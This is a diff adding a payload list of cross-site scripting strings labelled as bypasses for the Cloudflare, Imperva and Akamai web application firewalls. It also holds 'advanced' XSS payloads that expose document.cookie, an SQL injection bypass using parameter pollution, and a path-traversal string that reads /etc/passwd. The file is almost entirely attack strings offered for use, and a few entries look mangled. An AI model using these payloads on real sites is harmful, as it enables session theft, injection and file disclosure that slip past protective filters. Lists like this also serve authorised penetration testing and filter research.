@@ -1,0 +1,59 @@
+Cloudflare WAF Payload:
+-----------------------
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+&lt;img longdesc="src='x'onerror​=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E, <svg/onload​=alert("XSS") > 
+utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *> 
+”/>&_lt;_script>alert(1)&_lt;/script>”/>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover​=prompt&#40;1&#41;&#47;&#47;">XYZ</a>
+<​script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/<​/script /***/
+ellm1%3cscript%3ealert(1)%3c%2fscript%3ec2xwc
+"><iNput///type="password"////id="CF-bypaSS" name="query"////value=""///oNfocUs​="alert('hello')" AutOfoCus="" />
+&lt;img longdesc="src='x'onerror​=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<math><x xlink:href=javascript​:confirm`1`>click
+<img%20src=x%20onerror=”%26%2397%26%23108%26%23101%26%23114%26%23116(1)”>
+<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+<Svg%K9OnLoad=%7Krompt%6K1%6K>
+
+
+
+Imperva WAF Bypass:
+-------------------
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
+<svg><set onbegin​=d=document,b='`',d['loca'+'tion']='javascript​&colon;aler'+'t'+b+domain+b>
+
+
+
+Akamai WAF Bypass:
+-------------------
+<​style>@keyframes a{}b{animation:a;}<​/style><b/onanimationstart​=prompt`${document.domain}&#x60;>
+
+
+
+Advanced XSS Payloads:
+----------------------
+[a](javascript​:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74​&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+![a'"`onerror=prompt(document.cookie)](x)
+[notmalicious](javascript​:window.onerror=alert;throw%20document.cookie)
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
+![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
+<​script>a="import\x28"<​/script> <​script>b="`//0-a\x2e"<​/script> <​script>c="nl`\x29"<​/script><​script>d=setTimeout<​/script><​script>e=eval<​/script><​script>f=`${a}${b}${c}`<​/script><​script>d`e\x28f\x29`<​/script>
+1'"<S><A HRef=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt; Title=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;>
+
+
+
+SQL Injection Bypass Akamai WAF Using HPP:
+------------------------------------------
+q=1'Union DistinctRow/*&q=*/Select 1
+
+
+
+Local File Read/Disclosure - Akamai Bypass:
+-------------------------------------------
+file:///etc/x%252Fy/../passwd?/../passwd
+
+
